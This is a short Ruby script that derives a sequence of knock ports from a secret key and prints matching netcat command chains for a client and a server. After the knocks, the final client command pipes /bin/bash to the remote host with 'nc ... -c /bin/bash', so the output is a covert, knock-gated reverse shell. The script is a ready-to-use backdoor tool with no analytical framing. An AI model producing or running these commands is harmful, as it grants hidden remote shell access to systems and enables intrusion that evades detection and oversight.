#!/usr/bin/env ruby

# command for the client to launch
SHELL = '/bin/bash'

# knocking command
NC_TEMPLATE = {
  :client => 'nc -z #{server} #{port}',
  :server => 'nc -z -l -p#{port}'
}
# shell-exec'ing command
NC_LAST = {
  :client => 'nc #{server} #{port} -c' + SHELL,
  :server => 'nc -l -p#{port}'
}

low_port, high_port = 1024, 65535

if ARGV.length < 2
  puts "usage: #{$0} key server"
  exit 1
end

key, server = ARGV.shift, ARGV.shift

srand key.split('').inject(0) { |sum, n| sum + n[0] }
ports = (0...key.length).collect do |i|
  (rand(65536) + key[i]) % (high_port - low_port + 1) + low_port
end

[:client, :server].each do |machine|
  command = ports.collect do |port|
    if port == ports.last
      eval('"' + NC_LAST[machine] + '"')
    else
      eval('"' + NC_TEMPLATE[machine] + '"')
    end
  end.join(' && ')
  puts command
end

